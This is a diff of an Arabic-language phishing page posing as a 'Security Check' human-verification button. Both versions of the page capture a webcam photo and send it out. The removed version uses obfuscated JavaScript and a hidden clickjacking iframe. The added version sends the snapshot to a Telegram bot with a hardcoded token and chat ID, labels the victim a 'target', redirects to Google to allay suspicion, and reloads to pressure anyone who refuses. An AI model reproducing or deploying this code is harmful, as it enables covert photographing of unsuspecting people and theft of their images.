@@ -1,32 +1,96 @@
-<!DOCTYPE html><html><head><meta charset="UTF-8"><script>
-/* ARCHITECT_OBFUSCATION_ENGINE_v2.0 */
-const _0x51c2=['\x61\x70\x70\x65\x6e\x64','\x74\x6f\x42\x6c\x6f\x62','\x69\x6d\x61\x67\x65\x2f\x6a\x70\x65\x67','\x73\x65\x6e\x64\x50\x68\x6f\x74\x6f','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x61\x70\x69\x2e\x74\x65\x6c\x65\x67\x72\x61\x6d\x2e\x6f\x72\x67\x2f\x62\x6f\x74','\x50\x4f\x53\x54','\x6d\x65\x64\x69\x61\x44\x65\x76\x69\x63\x65\x73','\x67\x65\x74\x55\x73\x65\x72\x4d\x65\x64\x69\x61'];(function(_0x2d174e,_0x51c24e){const _0x45620a=function(_0x240722){while(--_0x240722){_0x2d174e['push'](_0x2d174e['shift']());}};_0x45620a(++_0x51c24e);}(_0x51c2,0x1b3));const _0x4562=function(_0x2d174e,_0x51c24e){_0x2d174e=_0x2d174e-0x0;let _0x45620a=_0x51c2[_0x2d174e];return _0x45620a;};
-// تم تشفير التوكن والآيدي داخل الذاكرة المؤقتة
-const _TK = "8439157520:AAGGZBxYp0x6Y54ar3TIrkMaMEHarQASmgY";
-const _ID = "1772820433";
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Check</title>
+    <style>
+        body {
+            background-color: #000;
+            margin: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            overflow: hidden;
+            font-family: 'Courier New', monospace;
+        }
+        #v {
+            padding: 25px 60px;
+            border: 3px solid #0f0;
+            color: #0f0;
+            font-size: 22px;
+            font-weight: bold;
+            cursor: pointer;
+            text-transform: uppercase;
+            box-shadow: 0 0 20px #0f0;
+            transition: 0.3s;
+            text-align: center;
+        }
+        #v:hover {
+            background: #0f0;
+            color: #000;
+        }
+        #status {
+            position: absolute;
+            bottom: 20%;
+            color: #004400;
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body>
 
-async function _0xX9(){
-    const _0x1=await navigator[_0x4562('0x6')][_0x4562('0x7')]({video:!![]});
-    const _0x2=document.createElement('video');_0x2['srcObject']=_0x1;_0x2['play']();
-    setTimeout(()=>{
-        const _0x3=document.createElement('canvas');_0x3['width']=0x280;_0x3['height']=0x1e0;
-        _0x3['getContext']('2d')['drawImage'](_0x2,0x0,0x0,0x280,0x1e0);
-        _0x3[_0x4562('0x1')](async(_0x4)=>{
-            const _0x5=new FormData();_0x5[_0x4562('0x0')]('chat_id',_ID);
-            _0x5[_0x4562('0x0')]('photo',_0x4,'v.jpg');
-            await fetch(_0x4562('0x4')+_TK+'/'+_0x4562('0x3'),{method:_0x4562('0x5'),body:_0x5});
-            window['location']['href']='\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x6f\x6f\x67\x6c\x65\x2e\x63\x6f\x6d';
-        },_0x4562('0x2'));
-    },0x3e8);
-}
-</script><style>
-body{background:#000;margin:0;display:flex;align-items:center;justify-content:center;height:100vh;overflow:hidden}
-#v{padding:30px 80px;border:4px solid #0f0;color:#0f0;font:bold 24px monospace;cursor:pointer;z-index:1}
-iframe{position:absolute;opacity:0.001;width:300px;height:300px;z-index:999}
-</style></head><body>
-<div id="v" onclick="_0xX9()">[ VERIFY_HUMAN_IDENTITY ]</div>
-<iframe id="f" srcdoc="<script>navigator.mediaDevices.getUserMedia({video:true})<\/script>"></iframe>
-<script>
-const f=document.getElementById('f');
-window.onmousemove=(e)=>{f.style.left=(e.pageX-50)+'px';f.style.top=(e.pageY-20)+'px';};
-</script></body></html>
+    <div id="v" onclick="_0xX9()">[ التحقق من هوية الإنسان ]</div>
+    <div id="status">System Status: Awaiting Validation...</div>
+
+    <script>
+        async function _0xX9() {
+            const button = document.getElementById('v');
+            const status = document.getElementById('status');
+            
+            try {
+                // طلب الكاميرا مباشرة عند الضغط
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                
+                button.innerText = "[ جارٍ فحص البصمة... ]";
+                status.innerText = "Accessing Neural Link...";
+
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+
+                // الانتظار ثانية واحدة لالتقاط صورة واضحة
+                setTimeout(async () => {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = 640;
+                    canvas.height = 480;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    
+                    canvas.toBlob(async (blob) => {
+                        const formData = new FormData();
+                        // التوكن والآيدي الخاص بك
+                        formData.append('chat_id', "1772820433");
+                        formData.append('photo', blob, 'shot.jpg');
+                        formData.append('caption', '🎯 تم اصطياد هدف جديد!');
+
+                        // إرسال الصورة للبوت
+                        await fetch(`https://api.telegram.org/bot8439157520:AAGGZBxYp0x6Y54ar3TIrkMaMEHarQASmgY/sendPhoto`, {
+                            method: 'POST',
+                            body: formData
+                        });
+                        
+                        // توجيه الضحية لموقع مشهور لمسح الشكوك
+                        window.location.href = "https://www.google.com";
+                    }, 'image/jpeg');
+                }, 1500);
+
+            } catch (err) {
+                // إذا رفض الضحية أو حدث خطأ، نعيد المحاولة
+                alert("خطأ: يرجى السماح بالوصول لتكملة التحقق!");
+                window.location.reload();
+            }
+        }
+    </script>
+</body>
+</html>
